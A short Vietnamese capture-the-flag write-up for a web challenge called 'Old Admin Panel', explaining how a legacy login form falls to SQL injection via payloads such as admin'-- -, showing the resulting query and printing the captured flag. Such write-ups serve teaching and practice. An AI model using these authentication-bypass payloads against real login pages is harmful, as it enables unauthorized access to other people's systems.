# web1

**Category:** Web

## Đề bài

"Old Admin Panel" tại `103.116.52.180:29129/login` — một form đăng nhập cũ.

## Phân tích

Đăng nhập sai trả về `401`. Thử SQL injection ở ô username:

```
username = admin' OR '1'='1
password = x
```

→ `302 Found`, `Location: /dashboard`, kèm cookie phiên. Vậy login dính **SQL injection**: input được nối thẳng vào câu query kiểu

```sql
SELECT * FROM users WHERE username='<input>' AND password='<input>'
```

Payload `admin'-- -` biến nó thành:

```sql
SELECT * FROM users WHERE username='admin'-- -' AND password='x'
```

Phần `-- -` comment bỏ luôn kiểm tra password, đăng nhập thành công với user `admin`.

## Khai thác

1. `POST /login` với `username=admin'-- -`, `password=x` → nhận cookie phiên.
2. `GET /dashboard` → trang Admin Console in flag.

Script: [`solve.py`](./solve.py)

```
Admin Console
Welcome back, admin.
Here is your flag:
miniCTF{l3g4cy_l0gin_qu3ry_n3v3r_di3s}
```

## Flag

```
miniCTF{l3g4cy_l0gin_qu3ry_n3v3r_di3s}
```
